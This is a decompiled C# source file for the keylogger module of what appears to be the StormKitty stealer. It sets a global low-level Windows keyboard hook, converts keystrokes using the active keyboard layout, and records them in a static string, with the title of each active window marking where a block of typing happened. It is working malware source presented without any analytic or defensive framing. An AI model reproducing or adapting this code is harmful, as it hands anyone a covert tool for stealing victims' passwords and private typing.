using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using StormKitty;

namespace Keylogger
{
	// Token: 0x0200003C RID: 60
	internal sealed class Keylogger
	{
		// Token: 0x060000F9 RID: 249
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, Keylogger.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x060000FA RID: 250
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x060000FB RID: 251
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x060000FC RID: 252
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x060000FD RID: 253
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		// Token: 0x060000FE RID: 254
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern short GetKeyState(int keyCode);

		// Token: 0x060000FF RID: 255
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		// Token: 0x06000100 RID: 256
		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint idThread);

		// Token: 0x06000101 RID: 257
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		// Token: 0x06000102 RID: 258
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		// Token: 0x06000103 RID: 259 RVA: 0x00008818 File Offset: 0x00006A18
		private static void StartKeylogger()
		{
			Keylogger._hookID = Keylogger.SetHook(Keylogger._proc);
			Application.Run();
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00008830 File Offset: 0x00006A30
		private static IntPtr SetHook(Keylogger.LowLevelKeyboardProc proc)
		{
			IntPtr result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				result = Keylogger.SetWindowsHookEx(13, proc, Keylogger.GetModuleHandle(currentProcess.ProcessName), 0U);
			}
			return result;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00008878 File Offset: 0x00006A78
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (!Keylogger.KeyloggerEnabled)
			{
				return IntPtr.Zero;
			}
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(lParam);
				bool flag = ((int)Keylogger.GetKeyState(20) & 65535) != 0;
				bool flag2 = ((int)Keylogger.GetKeyState(160) & 32768) != 0 || ((int)Keylogger.GetKeyState(161) & 32768) != 0;
				string text = Keylogger.KeyboardLayout((uint)num);
				if (flag || flag2)
				{
					text = text.ToUpper();
				}
				else
				{
					text = text.ToLower();
				}
				if (num >= 112 && num <= 135)
				{
					string str = "[";
					Keys keys = (Keys)num;
					text = str + keys.ToString() + "]";
				}
				else
				{
					Keys keys = (Keys)num;
					string text2 = keys.ToString();
					uint num2 = <PrivateImplementationDetails>.ComputeStringHash(text2);
					if (num2 <= 3250860581U)
					{
						if (num2 <= 497839467U)
						{
							if (num2 != 298493515U)
							{
								if (num2 == 497839467U)
								{
									if (text2 == "LControlKey")
									{
										text = "[CTRL]";
									}
								}
							}
							else if (text2 == "Capital")
							{
								if (flag)
								{
									text = "[CAPSLOCK: OFF]";
								}
								else
								{
									text = "[CAPSLOCK: ON]";
								}
							}
						}
						else if (num2 != 547024555U)
						{
							if (num2 != 3082514982U)
							{
								if (num2 == 3250860581U)
								{
									if (text2 == "Space")
									{
										text = " ";
									}
								}
							}
							else if (text2 == "Escape")
							{
								text = "[ESC]";
							}
						}
						else if (text2 == "LWin")
						{
							text = "[WIN]";
						}
					}
					else if (num2 <= 3822460366U)
					{
						if (num2 != 3264564162U)
						{
							if (num2 != 3422663135U)
							{
								if (num2 == 3822460366U)
								{
									if (text2 == "RShiftKey")
									{
										text = "[Shift]";
									}
								}
							}
							else if (text2 == "Return")
							{
								text = "[ENTER]";
							}
						}
						else if (text2 == "Back")
						{
							text = "[Back]";
						}
					}
					else if (num2 != 3954224277U)
					{
						if (num2 != 4117013200U)
						{
							if (num2 == 4219689196U)
							{
								if (text2 == "Tab")
								{
									text = "[Tab]";
								}
							}
						}
						else if (text2 == "LShiftKey")
						{
							text = "[Shift]";
						}
					}
					else if (text2 == "RControlKey")
					{
						text = "[CTRL]";
					}
				}
				if (text.Equals("[ENTER]"))
				{
					if (Keylogger.PrevActiveWindowTitle == WindowManager.ActiveWindow)
					{
						Keylogger.KeyLogs += Environment.NewLine;
					}
					else
					{
						Keylogger.PrevActiveWindowTitle = WindowManager.ActiveWindow;
						Keylogger.KeyLogs = Keylogger.KeyLogs + "\n###  " + Keylogger.PrevActiveWindowTitle + " ###\n";
					}
				}
				else if (text.Equals("[Back]") && Keylogger.KeyLogs.Length > 0)
				{
					Keylogger.KeyLogs = Keylogger.KeyLogs.Remove(Keylogger.KeyLogs.Length - 1, 1);
				}
				else
				{
					Keylogger.KeyLogs += text;
				}
			}
			return Keylogger.CallNextHookEx(Keylogger._hookID, nCode, wParam, lParam);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x00008BF4 File Offset: 0x00006DF4
		private static string KeyboardLayout(uint vkCode)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[256];
				if (!Keylogger.GetKeyboardState(lpKeyState))
				{
					return "";
				}
				uint wScanCode = Keylogger.MapVirtualKey(vkCode, 0U);
				uint num;
				IntPtr keyboardLayout = Keylogger.GetKeyboardLayout(Keylogger.GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out num));
				Keylogger.ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0U, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch
			{
			}
			Keys keys = (Keys)vkCode;
			return keys.ToString();
		}

		// Token: 0x04000061 RID: 97
		private const int WM_KEYDOWN = 256;

		// Token: 0x04000062 RID: 98
		private const int WHKEYBOARDLL = 13;

		// Token: 0x04000063 RID: 99
		private static IntPtr _hookID = IntPtr.Zero;

		// Token: 0x04000064 RID: 100
		private static Keylogger.LowLevelKeyboardProc _proc = new Keylogger.LowLevelKeyboardProc(Keylogger.HookCallback);

		// Token: 0x04000065 RID: 101
		public static bool KeyloggerEnabled = false;

		// Token: 0x04000066 RID: 102
		public static string KeyLogs = "";

		// Token: 0x04000067 RID: 103
		private static string PrevActiveWindowTitle;

		// Token: 0x04000068 RID: 104
		public static Thread MainThread = new Thread(new ThreadStart(Keylogger.StartKeylogger));

		// Token: 0x0200006C RID: 108
		// (Invoke) Token: 0x060001B0 RID: 432
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
